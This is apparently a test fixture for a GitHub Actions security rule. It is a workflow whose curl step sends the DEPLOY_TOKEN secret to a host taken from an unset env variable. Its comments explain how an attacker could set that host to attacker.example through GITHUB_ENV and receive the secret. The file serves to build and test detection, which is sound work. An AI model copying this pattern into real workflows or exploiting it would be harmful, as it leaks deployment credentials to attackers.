# situation: A step sends a request with curl and the secret DEPLOY_TOKEN to
#   the host env.NOWHERE names, which no env of the workflow sets.
# reason: a step before may set the env at run time through $GITHUB_ENV.
# cause: the rule reads the env the workflow writes.
# attack: the attacker makes the value attacker.example, where the value
#   comes from what the attacker writes.
# attack-run-behavior: curl sends the request with the secret to
#   attacker.example.
on: issues
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
    steps:
      - run: |
          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ env.NOWHERE }}/status"
